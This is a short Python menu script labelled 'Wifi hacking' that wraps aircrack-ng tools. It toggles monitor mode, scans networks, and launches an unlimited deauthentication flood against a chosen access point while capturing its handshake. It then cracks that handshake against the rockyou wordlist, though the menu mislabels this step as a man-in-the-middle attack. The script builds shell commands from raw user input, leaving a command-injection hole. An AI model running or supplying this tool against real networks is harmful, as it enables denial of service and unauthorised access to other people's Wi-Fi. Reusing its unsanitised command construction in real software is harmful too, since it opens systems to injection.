import pyfiglet
import os
import subprocess
from subprocess import check_call
banner=pyfiglet.figlet_format("Wifi hacking")


def prRed(skk):
	print("\033[91m {} \033".format(skk))
	return
def prCyan(skk):
	print("\033[96m {} \033".format(skk))
	return
def prGreen(skk):
	print("\033[92m {} \033".format(skk))
	return
def prYellow(skk):
	print("\033[93m {} \033".format(skk))	
	return


def intro():
	cmd = os.system("clear")
	print(banner)	
	prRed("Done by Anantha Raman and Nithiya Shri")


	prCyan("[+] 1) Start Monitor mode")
	prCyan("[+] 2) Stop Monitor mode")
	prCyan("[+] 3) Scan wifi networks")
	prCyan("[+] 4) Wifi attack menu")

	prGreen("[-] Enter your choice")
	ch=int(input(""))
	
	if ch==1:
		prYellow("Enter the interface(wlan0/wlan1)")
		interface=str(input())
		cmd = "airmon-ng start {} && airmon-ng check kill".format(interface)
		geny= os.system(cmd)
		intro()
		print(cmd)
	elif ch==2:
		prYellow("Enter the interface(wlan0/wlan1)")
		interface=str(input())
		cmd = "airmon-ng stop {} && service network-manager restart".format(interface)
		geny = os.system(cmd)
		intro()
	elif ch==3:
		interface = input("Name of the interface:")
		cmd = "airodump-ng {}".format(interface)
		prRed("Press cntrl + c when done")
		cmd1 = os.system("sleep 3")
		geny = os.system(cmd)
		cmd2 = os.system("sleep 10")
		intro()
	elif ch==4:
		prRed("[*] 1) Perform DoS")
		prRed("[*] 2) Perform MITM")
		val = int(input("Enter your input:"))
		if val == 1:
			bssid = str(input("Enter the bssid of the device:"))
			channel = int(input("Enter the channel:"))
			interface = input("Enter the interface:")
			ofile = input("Name of the output file: ")
			cmd = "airodump-ng {} --bssid {} -c {} -w {} | aireplay-ng --deauth 0 -a {} {}".format(interface,bssid,channel,ofile,bssid,interface)
			cmd1 = os.system("sleep 1")
			geny = os.system(cmd)
		elif val==2:
			op = input("name of the file: ")
			cmd = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(op)
			geny = os.system(cmd)
			 
		
		
intro()
